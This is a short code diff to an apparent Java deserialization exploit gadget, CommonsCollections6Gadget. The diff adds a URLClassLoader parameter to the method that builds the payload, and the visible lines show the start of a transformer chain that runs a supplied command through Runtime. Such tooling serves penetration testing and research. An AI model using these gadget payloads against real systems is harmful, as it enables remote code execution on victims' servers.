@@ -14,6 +14,7 @@ import org.mozilla.javascript.DefiningClassLoader;
 
 import java.io.Serializable;
 import java.lang.reflect.Field;
+import java.net.URLClassLoader;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Map;
@@ -38,7 +39,7 @@ public class CommonsCollections6Gadget implements ObjectPayload<Serializable> {
      * @throws Exception
      */
     @Override
-    public Serializable getObject(String command) throws Exception {
+    public Serializable getObject(String command, URLClassLoader urlClassLoader) throws Exception {
         final String[] execArgs = new String[] { command };
         final Transformer[] transformers = new Transformer[] {
                 new ConstantTransformer(Runtime.class),
